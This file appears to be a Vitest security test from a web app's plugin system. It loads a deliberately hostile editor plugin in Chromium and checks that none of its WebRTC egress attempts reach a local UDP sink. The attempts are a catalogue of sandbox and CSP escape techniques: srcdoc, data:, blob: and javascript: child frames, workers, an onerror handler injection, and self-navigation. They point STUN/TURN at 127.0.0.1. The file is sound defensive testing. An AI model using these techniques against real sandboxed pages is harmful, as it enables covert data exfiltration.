/**
 * The editor-frame egress probe: a hostile editor plugin, served by crew's own routes (the frame guard, `serveBundle`,
 * the shell policy), framed in Chromium the way studio's host frames it (`sandbox="allow-scripts"`), tries every way
 * it has to open WebRTC: the constructors directly and after trying to restore them, and from a new realm (a child
 * frame of each kind, a worker, or the frame navigating itself to a document it made). Each attempt gets its own
 * loopback UDP sink standing in for a STUN/TURN server. The probe passes only when zero packets arrive.
 *
 * It cannot pass by accident. The hostile plugin must report that it ran, and where an attempt does open a new realm,
 * that realm must report that it found no constructor. The same plugin served raw under the policy crew used before
 * (`BEFORE`) must get packets through: that proves the sink and the browser's WebRTC work. A well-behaved bundle with
 * awkward scripts must run every one of them with no policy violation.
 *
 * Chromium comes from the `playwright` dev dependency (`npx playwright install --only-shell chromium`). CI's ubuntu leg
 * installs it and sets `WICKED_EGRESS_PROBE=required`, so a missing browser fails there. Anywhere else, with no
 * browser, the probe is skipped and says why.
 */
import { createSocket, type Socket } from 'node:dgram';
import { mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';

import Fastify, { type FastifyInstance } from 'fastify';
import type { Browser } from 'playwright';
import { afterAll, beforeAll, describe, expect, it } from 'vitest';

import { registerFrameGuard } from '../src/api/frame-guard.js';
import { requestOrigin, shellCsp } from '../src/editors/csp.js';
import { sha256Of, type EditorRecord } from '../src/editors/registry.js';
import { serveBundle } from '../src/editors/routes.js';

const REQUIRED = process.env['WICKED_EGRESS_PROBE'] === 'required';

/** The third-party bundle policy crew served before this guard (the positive control runs under it). */
const BEFORE =
  "sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; img-src data: blob:; " +
  "media-src blob:; font-src data:; frame-src blob: data: about:; child-src blob: data: about:; connect-src 'none'; " +
  "form-action 'none'; base-uri 'none'; worker-src 'none'; manifest-src 'none'";

/**
 * The hostile plugin: one inline script. In the bundle it reports `ran`, then makes its attempt. In any other
 * document it reports `child-ran` and tries WebRTC there. It hands new documents a copy of its own script (what
 * crew served it, prelude and all): under a hash policy that copy is the only script that can run there.
 */
function hostile(attempt: string, port: number): string {
  const js = `var U=${JSON.stringify(String(port))};
function report(m){try{top.postMessage({probe:String(m)},'*')}catch(e){}}
function rtc(W,tag){try{var C=W.RTCPeerConnection||W.webkitRTCPeerConnection;if(typeof C!=='function'){report(tag+':no-ctor');return}
var pc=new C({iceServers:[{urls:'stun:127.0.0.1:'+U},{urls:'turn:127.0.0.1:'+U+'?transport=udp',username:'leak',credential:'x'}]});
pc.createDataChannel('x');pc.createOffer().then(function(o){return pc.setLocalDescription(o)}).then(function(){report(tag+':offer-set')},function(){});
report(tag+':rtc-created')}catch(e){report(tag+':rtc-threw:'+e.name)}}
var SELF=document.currentScript?document.currentScript.textContent:'';
var CHILD='<scr'+'ipt>'+SELF+'</scr'+'ipt>';
var FRESH='<scr'+'ipt>var U='+JSON.stringify(U)+';'+report+rtc+'rtc(window,"fresh")</scr'+'ipt>';
if(location.protocol!=='http:'){report('child-ran:'+location.protocol);rtc(window,'child')}
else{report('ran');${attempt}}`;
  return `<!doctype html><html><head><meta charset="utf-8"><title>probe</title></head><body><p>hostile</p><script>${js}</script></body></html>`;
}

/** Every attempt, and what the new realm (if the browser makes one) must say. */
const ATTEMPTS: Record<string, { code: string; childMustReport?: string }> = {
  direct: { code: "rtc(window,'direct')" },
  restore: { code: "try{delete window.RTCPeerConnection}catch(e){};Object.getOwnPropertyNames(window).forEach(function(k){if(/RTC/.test(k)&&typeof window[k]==='function')report('found:'+k)});rtc(window,'restore')" },
  'srcdoc-copy': { code: "var f=document.createElement('iframe');f.srcdoc=CHILD;document.body.appendChild(f)", childMustReport: 'child:no-ctor' },
  'srcdoc-fresh': { code: "var f=document.createElement('iframe');f.srcdoc=FRESH;document.body.appendChild(f)" },
  'srcdoc-markup': { code: "document.body.insertAdjacentHTML('beforeend','<iframe srcdoc=\"'+CHILD.replace(/&/g,'&amp;').replace(/\"/g,'&quot;')+'\"></iframe>')", childMustReport: 'child:no-ctor' },
  'javascript-child': { code: "var f=document.createElement('iframe');f.src='javascript:'+JSON.stringify(CHILD);document.body.appendChild(f)" },
  'data-child': { code: "var f=document.createElement('iframe');f.src='data:text/html,'+encodeURIComponent(CHILD);document.body.appendChild(f)" },
  'blob-child': { code: "var f=document.createElement('iframe');f.src=URL.createObjectURL(new Blob([CHILD],{type:'text/html'}));document.body.appendChild(f)" },
  'blank-child': { code: "var f=document.createElement('iframe');document.body.appendChild(f);rtc(f.contentWindow,'blank')" },
  worker: { code: "try{var w=new Worker(URL.createObjectURL(new Blob(['postMessage(typeof RTCPeerConnection)'],{type:'text/javascript'})));w.onmessage=function(e){report('worker:'+e.data)}}catch(e){report('worker-threw')}" },
  handler: { code: "document.body.insertAdjacentHTML('beforeend','<img src=x onerror=\"'+(report+rtc+'rtc(window,\\'handler\\')').replace(/&/g,'&amp;').replace(/\"/g,'&quot;')+'\">')" },
  'navigate-blob': { code: "location.href=URL.createObjectURL(new Blob([CHILD],{type:'text/html'}))", childMustReport: 'child:no-ctor' },
  'navigate-data': { code: "location.href='data:text/html,'+encodeURIComponent(CHILD)", childMustReport: 'child:no-ctor' },
  'navigate-refresh': { code: "var m=document.createElement('meta');m.httpEquiv='refresh';m.content='0;url='+URL.createObjectURL(new Blob([CHILD],{type:'text/html'}));document.head.appendChild(m)", childMustReport: 'child:no-ctor' },
  'navigate-fresh': { code: "location.href=URL.createObjectURL(new Blob([FRESH],{type:'text/html'}))" },
  'navigate-javascript': { code: "location.href='javascript:'+JSON.stringify(CHILD)" },
};

/** A well-behaved bundle with awkward scripts: every one must run under the guard, with no policy violation. */
const WELL_BEHAVED =
  '<!DOCTYPE html>\r\n<html><head><meta charset="utf-8"><style>/* <script>not a script</script> */ p{color:red}</style>' +
  '<script type="application/json" id="data">{"n":3}</script>' +
  '<script>\r\nvar seen=[];function ok(n){seen.push(n);top.postMessage({probe:"ok:"+n},"*")}\r\nvar tag="<script>";var esc="<!--<script>x</script>-->";ok(1)</script>' +
  '</head><body><p title="<script>">x</p><!-- <script>bad()</script> -->' +
  '<script type="module">ok(2)</script>' +
  '<script>ok(JSON.parse(document.getElementById("data").textContent).n)</script>' +
  '</body></html>';

interface Sink { port: number; packets: () => number; close: () => void }
async function udpSink(): Promise<Sink> {
  const sock: Socket = createSocket('udp4');
  let count = 0;
  sock.on('message', () => { count += 1; });
  await new Promise<void>((resolve) => sock.bind(0, '127.0.0.1', () => resolve()));
  return { port: sock.address().port, packets: () => count, close: () => sock.close() };
}

describe('editor frames: zero WebRTC egress from a hostile plugin (Chromium, crew\'s real routes)', () => {
  let browser: Browser | null = null;
  let unavailable = '';
  let app: FastifyInstance;
  let origin = '';
  const dir = mkdtempSync(join(tmpdir(), 'egress-probe-'));
  const records = new Map<string, EditorRecord>();
  const control = new Map<string, string>();

  const record = (id: string, html: string, firstParty: boolean): void => {
    const entryPath = join(dir, `${id}.html`);
    writeFileSync(entryPath, html);
    const buf = Buffer.from(html);
    records.set(id, {
      manifest: { id, title: id, version: '1.0.0', protocol: [1], kinds: ['page'], entry: 'index.html', sizes: ['inline'], permissions: [] },
      sha256: sha256Of(buf),
      bytes: buf.length,
      entryPath,
      firstParty,
      source: firstParty ? 'studio-bundle' : 'pack',
      enabled: true,
    } as unknown as EditorRecord);
  };

  beforeAll(async () => {
    try {
      const { chromium } = await import('playwright');
      browser = await chromium.launch();
    } catch (err) {
      unavailable = (err instanceof Error ? err.message : String(err)).split('\n')[0]!;
    }
    app = Fastify();
    registerFrameGuard(app, { allowedOrigins: [] });
    // The studio shell, as crew serves index.html: its frame-src, and a frame made the way studio's host makes one.
    app.get('/shell', async (req, reply) => {
      const src = String((req.query as { src?: string }).src ?? '');
      reply.header('Content-Security-Policy', shellCsp(requestOrigin(req)));
      return reply.type('text/html').send(
        `<!doctype html><body><script>window.R=[];addEventListener('message',function(e){if(e.data&&e.data.probe)R.push(e.data.probe)});` +
          `var f=document.createElement('iframe');f.setAttribute('sandbox','allow-scripts');f.setAttribute('referrerpolicy','no-referrer');` +
          `f.src=${JSON.stringify(src)};document.body.appendChild(f);</script></body>`,
      );
    });
    app.get('/api/v1/editors/control/:id/entry', async (req, reply) => {
      const html = control.get((req.params as { id: string }).id);
      if (html === undefined) return reply.code(404).send({});
      return reply.header('Content-Security-Policy', BEFORE).type('text/html; charset=utf-8').send(html);
    });
    app.get('/api/v1/editors/:id/:version/entry', async (req, reply) => {
      const r = records.get((req.params as { id: string }).id);
      if (r === undefined) return reply.code(404).send({});
      return serveBundle(r, reply);
    });
    origin = await app.listen({ port: 0, host: '127.0.0.1' });
  });

  afterAll(async () => {
    await browser?.close();
    await app?.close();
    rmSync(dir, { recursive: true, force: true });
  });

  /** One frame load: what the frames reported, the policy refusals in the console, and the packets the sink got. */
  async function load(src: string, sink: Sink, settleMs = 1500): Promise<{ said: string[]; refused: string[]; packets: number }> {
    const page = await browser!.newPage();
    const refused: string[] = [];
    page.on('console', (m) => { if (/Content Security Policy|Content-Security-Policy/.test(m.text())) refused.push(m.text().slice(0, 140)); });
    try {
      await page.goto(`${origin}/shell?src=${encodeURIComponent(src)}`);
      await page.waitForFunction('window.R && window.R.length > 0', undefined, { timeout: 10_000 }).catch(() => undefined);
      await page.waitForTimeout(settleMs);
      const said = (await page.evaluate('window.R')) as string[];
      return { said, refused, packets: sink.packets() };
    } finally {
      await page.close();
    }
  }

  const needBrowser = (skip: () => void): void => {
    if (browser !== null) return;
    if (REQUIRED) throw new Error(`WICKED_EGRESS_PROBE=required but Chromium did not start: ${unavailable}`);
    console.warn(`[egress probe] skipped: no Chromium (${unavailable}). Run \`npx playwright install --only-shell chromium\`.`);
    skip();
  };

  it('positive control: the same plugin under the policy crew served before reaches the sink (the sink and WebRTC work)', async (ctx) => {
    needBrowser(() => ctx.skip());
    const sink = await udpSink();
    try {
      control.set('direct', hostile(ATTEMPTS['direct']!.code, sink.port));
      const r = await load('/api/v1/editors/control/direct/entry', sink);
      expect(r.said).toContain('ran');
      expect(r.packets, JSON.stringify(r)).toBeGreaterThan(0);
    } finally {
      sink.close();
    }
  }, 60_000);

  it('a third-party plugin: zero packets from every attempt, and every new realm it opened found no constructor', async (ctx) => {
    needBrowser(() => ctx.skip());
    const names = Object.keys(ATTEMPTS);
    const results: Record<string, { said: string[]; refused: string[]; packets: number }> = {};
    for (let i = 0; i < names.length; i += 6) {
      await Promise.all(names.slice(i, i + 6).map(async (name) => {
        const sink = await udpSink();
        try {
          record(`acme-${name}`, hostile(ATTEMPTS[name]!.code, sink.port), false);
          results[name] = await load(`/api/v1/editors/acme-${name}/1.0.0/entry`, sink);
        } finally {
          sink.close();
        }
      }));
    }
    console.log(`[egress probe] third-party packets per attempt: ${names.map((n) => `${n}=${results[n]!.packets}`).join(' ')}`);
    for (const name of names) {
      const r = results[name]!;
      expect(r.said, `${name}: the plugin ran (${JSON.stringify(r)})`).toContain('ran');
      expect(r.packets, `${name}: UDP packets (${JSON.stringify(r)})`).toBe(0);
      expect(r.said.filter((m) => /rtc-created|offer-set|^found:/.test(m)), name).toEqual([]);
      const must = ATTEMPTS[name]!.childMustReport;
      if (must !== undefined) expect(r.said, `${name}: the new realm ran and found no constructor`).toContain(must);
    }
  }, 120_000);

  // A first-party bundle is studio's own code: what matters is that the prelude runs in it and that its nested frames
  // (which hold agent HTML, guarded by studio) cannot load a URL. Where the bundle's own frame navigates is studio's
  // shell policy, which keeps `blob:` for run plugins.
  it('a first-party bundle: the prelude runs (no constructor) and it cannot load a child frame from a URL', async (ctx) => {
    needBrowser(() => ctx.skip());
    for (const name of ['direct', 'blob-child', 'data-child']) {
      const sink = await udpSink();
      try {
        record(`wicked-${name}`, hostile(ATTEMPTS[name]!.code, sink.port), true);
        const r = await load(`/api/v1/editors/wicked-${name}/1.0.0/entry`, sink);
        expect(r.said, name).toContain('ran');
        expect(r.packets, `${name}: ${JSON.stringify(r)}`).toBe(0);
        if (name === 'direct') expect(r.said).toContain('direct:no-ctor');
        if (name !== 'direct') expect(r.refused.some((m) => /frame-src/.test(m)), `${name}: refused by frame-src`).toBe(true);
      } finally {
        sink.close();
      }
    }
  }, 60_000);

  it('a well-behaved third-party bundle with awkward scripts still runs every script, with no policy refusal', async (ctx) => {
    needBrowser(() => ctx.skip());
    const sink = await udpSink();
    try {
      record('acme-ok', WELL_BEHAVED, false);
      const r = await load('/api/v1/editors/acme-ok/1.0.0/entry', sink, 800);
      expect(r.said.sort(), JSON.stringify(r)).toEqual(['ok:1', 'ok:2', 'ok:3']);
      expect(r.refused).toEqual([]);
    } finally {
      sink.close();
    }
  }, 60_000);
});
